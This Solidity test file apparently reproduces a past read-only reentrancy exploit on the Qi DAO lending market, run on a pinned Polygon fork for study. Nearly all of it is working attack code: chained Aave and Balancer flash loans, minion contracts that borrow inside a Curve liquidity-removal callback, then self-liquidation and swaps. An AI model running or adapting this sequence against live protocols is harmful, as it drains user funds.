// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";

import {BalancerFlashloan} from "../../utils/BalancerFlashloan.sol";

import "./QiAttack.interfaces.sol";

contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
    IAaveFlashloan aave = IAaveFlashloan(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
    address aWMaticProxy = 0x8dF3aad3a84da6b69A4DA8aeC3eA40d9091B2Ac4;

    // The tokens involved in the pool
    IWETH9 WMATIC = IWETH9(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 stLIDOMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);

    // Beefy delegators. Beefy is an Vault that wants LP_TOKENS from
    // Curve pools.
    ICERC20Delegator STMATIC_MATIC_DELEGATOR = ICERC20Delegator(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
    IVault BEEFY_STMATIC = IVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);

    // QIDAO Compound delegator and underlying
    ICERC20Delegator QIDAO_DELEGATOR = ICERC20Delegator(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
    IERC20 QI_MIMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);

    // Unitroller and price feed used by the unitroller. The attacker does not query
    // the price (they might have precalculated the amounts) but is useful to
    // generalize the test
    IPriceFeed PRICE_FEED = IPriceFeed(0x71585E806402473Ff25eda3e2C3C17168767858a);
    IUnitroller UNITROLLER = IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);

    // STLidoMatic/WMATIC Curve pool
    ICurvePool constant CURVE_STMATIC_POOL = ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
    IERC20 CURVE_STMATIC_LP_TOKEN = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);

    // UniswapV2Router
    IUniswapV2Router02 router = IUniswapV2Router02(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);

    // Let's store the price of the LP tokens in different moments of the transaction
    // To see how it goes up during the reentrancy and then comes back to normal
    uint256 priceAtBeginning;
    uint256 priceDuringCallback;
    uint256 priceAfterCallback;

    Attacker_Minion_One internal minionOne;
    Attacker_Minion_Two internal minionTwo;
    Attacker_Minion_One internal minionThree;

    // In reality, the attacker used some minion contracts which they deployed from their
    // main contract to execute the attacks. Here, we simplify and use only one contract
    // and reproduce the attack only to Qi Protocol.
    // The attacker minion address can be found at
    // https://polygonscan.com/address/0x8d1e7cE7DbB14aFB8782EaEa8010938cC457115e
    function setUp() external {
        cheat.createSelectFork("polygon", 34716800); // We pin one block before the exploit happened.

        cheat.label(address(this), "Attacker Contract");
        cheat.label(address(CURVE_STMATIC_POOL), "Curve Pool");
        cheat.label(address(CURVE_STMATIC_LP_TOKEN), "LP Token");
        cheat.label(address(QIDAO_DELEGATOR), "QiDAO Delegator");

        cheat.deal(address(this), 0);
    }

    function test_attack() external {
        run();
    }

    // Same signature as attacker's
    function run() public {
        console.log("\n===== 1. REQUEST FLASHLOAN ON AAVE ======");
        address[] memory _tokens = new address[](1);
        _tokens[0] = address(WMATIC);

        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 15419963467577188022568076;

        uint256[] memory _arg3 = new uint256[](1);
        _arg3[0] = 0;

        aave.flashLoan(address(this), _tokens, _amounts, _arg3, address(this), "", 0);
    }

    function executeOperation(
        address[] memory _tokens,
        uint256[] memory _amounts,
        uint256[] memory _fees,
        address _requester,
        bytes memory /*_data*/
    ) external returns(bool) {
        require(_requester == address(this), "Flashloan not requested");
        require(msg.sender == address(aave), "Not called by Aave");
        require(address(WMATIC) == _tokens[0], "Wrong tokens requested");

        console.log("\n===== 2. REQUEST FLASHLOAN ON BALANCER ======");

        address[] memory _tokensBalancer = new address[](2);
        _tokensBalancer[0] = address(WMATIC);
        _tokensBalancer[1] = address(stLIDOMATIC);

        uint256[] memory _amountsBalancer = new uint256[](2);
        _amountsBalancer[0] = WMATIC.balanceOf(address(balancer));
        _amountsBalancer[1] = 19664260000000000000000000;

        priceAtBeginning = get_lp_token_price_for_compound();
        console.log("INITIAL LP TOKEN PRICE: %s", priceAtBeginning);
        balancer.flashLoan(address(this), _tokensBalancer, _amountsBalancer, "");

        console.log("\n===== 18. Approve Aave for Repayment =====");
        WMATIC.approve(address(aave), _amounts[0] + _fees[0]);
        
        return true;
    }

    function receiveFlashLoan(IERC20[] memory tokens, uint256[] memory amounts, uint256[] memory, bytes memory)
        external
        payable
    {
        // Sensible requires to aid development
        require(msg.sender == address(balancer), "only callable by balancer");
        require(tokens.length == 2 && tokens.length == amounts.length, "length missmatch");
        require(address(tokens[0]) == address(WMATIC));
        require(address(tokens[1]) == address(stLIDOMATIC));

        console.log("\n===== 3. HANDLE BALANCER FLASHLOAN ======");

        console.log("\n===== 4. Deploy and fund Minion One =====");
        uint256 _borrowAmt = QI_MIMATIC.balanceOf(address(QIDAO_DELEGATOR)) * 1000 / 1004;
        console.log(_borrowAmt);
        minionOne = new Attacker_Minion_One(address(this), 90000000000000000000000, _borrowAmt); // (commander, depositAmt, borrowAmt)

        WMATIC.transfer(address(minionOne), WMATIC.balanceOf(address(this)));
        stLIDOMATIC.transfer(address(minionOne), stLIDOMATIC.balanceOf(address(this)));

        console.log("\n===== 5. Minion One begins its operations =====");
        minionOne.borrow();

        console.log("\n===== 6. Deploy Minion Two =====");
        minionTwo = new Attacker_Minion_Two(address(this));

        console.log("\n===== 7. Minion Two liquidates Minion One =====");
        uint256 attackAmt = QI_MIMATIC.balanceOf(address(this)) * 265 / 1000;
        QI_MIMATIC.transfer(address(minionTwo), attackAmt);
        minionTwo.liquidate(address(minionOne), QI_MIMATIC, QIDAO_DELEGATOR, STMATIC_MATIC_DELEGATOR, attackAmt);

        console.log("\n===== 8. Commander Withdraws all from Beefy and Removes Liqudity =====");
        BEEFY_STMATIC.withdrawAll();
        uint256[2] memory minAmounts = [uint256(0), uint256(0)];
        CURVE_STMATIC_POOL.remove_liquidity(CURVE_STMATIC_LP_TOKEN.balanceOf(address(this)), minAmounts, true);

        console.log("\n===== 10. Commander Exchanges Matic for WMATIC =====");
        WMATIC.deposit{value: address(this).balance}();

        console.log("\n===== 11. Deploy and fund Minion Three =====");
        _borrowAmt = QI_MIMATIC.balanceOf(address(QIDAO_DELEGATOR)) * 1000 / 1004;
        minionThree = new Attacker_Minion_One(address(this), 25000000000000000000000, _borrowAmt); // (commander, depositAmt, borrowAmt)

        WMATIC.transfer(address(minionThree), WMATIC.balanceOf(address(this)));
        stLIDOMATIC.transfer(address(minionThree), stLIDOMATIC.balanceOf(address(this)));

        console.log("\n===== 12. Minion Three begins its operations =====");
        minionThree.borrow();

        console.log("\n===== 13. Minion Two liquidates Minion One =====");
        attackAmt = QI_MIMATIC.balanceOf(address(this)) * 6 / 100;
        QI_MIMATIC.transfer(address(minionTwo), attackAmt);
        minionTwo.liquidate(address(minionThree), QI_MIMATIC, QIDAO_DELEGATOR, STMATIC_MATIC_DELEGATOR, attackAmt);

        console.log("\n===== 14. Commander Withdraws all from Beefy and Removes Liqudity =====");
        BEEFY_STMATIC.withdrawAll();
        CURVE_STMATIC_POOL.remove_liquidity(CURVE_STMATIC_LP_TOKEN.balanceOf(address(this)), minAmounts, true);

        console.log("\n===== 15. Swap and Exchange =====");
        _swap();
        _exchange();

        console.log("\n===== 16. Deposit WMATIC =====");
        WMATIC.deposit{value: address(this).balance}();

        console.log("\n===== 17. Repay Balancer =====");
        WMATIC.transfer(address(balancer), amounts[0]);
        stLIDOMATIC.transfer(address(balancer), amounts[1]);
    }

    receive() external payable {}

    function _swap() internal {
        QI_MIMATIC.approve(address(router), type(uint256).max);

        address[] memory path = new address[](3);
        path[0] = address(QI_MIMATIC);
        path[1] = address(USDC);
        path[2] = address(WMATIC);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(95_000e18, 1, path, address(this), block.timestamp); // Qi Tokens for WMATIC
    }

    function _exchange() internal {
        WMATIC.approve(address(CURVE_STMATIC_POOL), type(uint256).max);
        CURVE_STMATIC_POOL.exchange(1, 0, 20000000000000000000000, 8964360265059868271032, false);
    }
}

contract Attacker_Minion_One {
    IWETH9 WMATIC = IWETH9(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 stLIDOMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);

    // STLidoMatic/WMATIC Curve pool
    ICurvePool constant CURVE_STMATIC_POOL = ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
    IERC20 CURVE_STMATIC_LP_TOKEN = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);

    ICERC20Delegator STMATIC_MATIC_DELEGATOR = ICERC20Delegator(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
    IVault BEEFY_STMATIC = IVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);

    IUnitroller UNITROLLER = IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);

    // QIDAO Compound delegator and underlying
    ICERC20Delegator QIDAO_DELEGATOR = ICERC20Delegator(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
    IERC20 QI_MIMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);

    address internal immutable ATTACKER_COMMANDER;

    uint256 internal depositAmt;
    uint256 internal borrowAmt;

    constructor(address _attackerCommander, uint256 _beefyDepositAmt, uint256 _qiBorrowAmt) {
        ATTACKER_COMMANDER = _attackerCommander;

        depositAmt = _beefyDepositAmt;
        borrowAmt = _qiBorrowAmt;
    }

    // same signature as attacker's
    function borrow() external {
        // Approve WMATIC and stMATIC. Well executed step as it not grants infinite allowance.
        uint256 initialWMaticBalance = WMATIC.balanceOf(address(this));
        uint256 initialStLidoMaticBalance = stLIDOMATIC.balanceOf(address(this));

        WMATIC.approve(address(CURVE_STMATIC_POOL), initialWMaticBalance);
        stLIDOMATIC.approve(address(CURVE_STMATIC_POOL), initialStLidoMaticBalance);

        // Add Liquidity to Curve Pool
        console.log("Add Liquidity to Curve");
        CURVE_STMATIC_POOL.add_liquidity([initialStLidoMaticBalance, initialWMaticBalance], 0, false);

        // Enter market
        address[] memory _markets = new address[](1);
        _markets[0] = address(STMATIC_MATIC_DELEGATOR);
        UNITROLLER.enterMarkets(_markets);

        // Deposit and Mint
        console.log("Deposit and Mint");
        CURVE_STMATIC_LP_TOKEN.approve(address(BEEFY_STMATIC), depositAmt);
        BEEFY_STMATIC.deposit(depositAmt);
        uint256 stMaticBalance = BEEFY_STMATIC.balanceOf(address(this));
        BEEFY_STMATIC.approve(address(STMATIC_MATIC_DELEGATOR), stMaticBalance);
        STMATIC_MATIC_DELEGATOR.mint(stMaticBalance);

        // Remove liquidity - by setting 'use_eth = true', it will trigger the logic inside receive().
        console.log("Remove Liquidity from Curve");
        uint256[2] memory minAmounts = [uint256(0), uint256(0)];
        CURVE_STMATIC_POOL.remove_liquidity(
            CURVE_STMATIC_LP_TOKEN.balanceOf(address(this)),
            minAmounts,
            /*use_eth*/
            true
        );

        console.log("Transfer LP Token to Attacker Contract");
        // This step is curious since the amount transferred is zero... pseudo-automated attack?
        CURVE_STMATIC_LP_TOKEN.transfer(ATTACKER_COMMANDER, CURVE_STMATIC_LP_TOKEN.balanceOf(address(this)));

        console.log("Transfer Natives to Attacker Contract");
        (bool success,) = ATTACKER_COMMANDER.call{value: address(this).balance}("");
        require(success, "native tx fail: Minion 1 to Commander");

        console.log("Transfer WMATIC to Attacker Contract");
        // Same comment as before with zero amount
        WMATIC.transfer(ATTACKER_COMMANDER, WMATIC.balanceOf(address(this)));

        console.log("Transfer stLIDOMATIC to Attacker Contract");
        stLIDOMATIC.transfer(ATTACKER_COMMANDER, stLIDOMATIC.balanceOf(address(this)));

        console.log("Transfer Qi MiMatic to Attacker Contract");
        QI_MIMATIC.transfer(ATTACKER_COMMANDER, QI_MIMATIC.balanceOf(address(this)));
    }

    receive() external payable {
        console.log("Reentrant Call: Borrow Qi - LP TOKEN PRICE: %s", get_lp_token_price_for_compound());
        QIDAO_DELEGATOR.borrow(borrowAmt);
    }
}

contract Attacker_Minion_Two {
    IWETH9 WMATIC = IWETH9(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 stLIDOMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);

    // STLidoMatic/WMATIC Curve pool
    ICurvePool constant CURVE_STMATIC_POOL = ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
    IERC20 CURVE_STMATIC_LP_TOKEN = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);

    ICERC20Delegator QIDAO_DELEGATOR = ICERC20Delegator(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
    IERC20 QI_MIMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);

    ICERC20Delegator STMATIC_MATIC_DELEGATOR = ICERC20Delegator(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
    IVault BEEFY_STMATIC = IVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);

    address internal immutable ATTACKER_COMMANDER;

    constructor(address _attackerCommander) {
        ATTACKER_COMMANDER = _attackerCommander;
    }

    function liquidate(
        address accountToLiquidate,
        IERC20 liquidationToken,
        ICERC20Delegator delegatorPool,
        ICERC20Delegator lpTokenDelegator,
        uint256 liqAmount
    ) external {
        console.log("Liquidate Borrow Position of Minion One");
        liquidationToken.approve(address(delegatorPool), type(uint256).max);
        delegatorPool.liquidateBorrow(accountToLiquidate, liqAmount, address(lpTokenDelegator));

        console.log("Redeem stMatic-Matic");
        lpTokenDelegator.redeem(lpTokenDelegator.balanceOf(address(this)));

        console.log("Transfer underlying to Commander");
        IVault _underlying = IVault(lpTokenDelegator.underlying());
        _underlying.transfer(ATTACKER_COMMANDER, _underlying.balanceOf(address(this)));
    }
}
      //   minionTwo.liquidate(address(minionOne), QI_MIMATIC, QIDAO_DELEGATOR, STMATIC_MATIC_DELEGATOR, attackAmt);
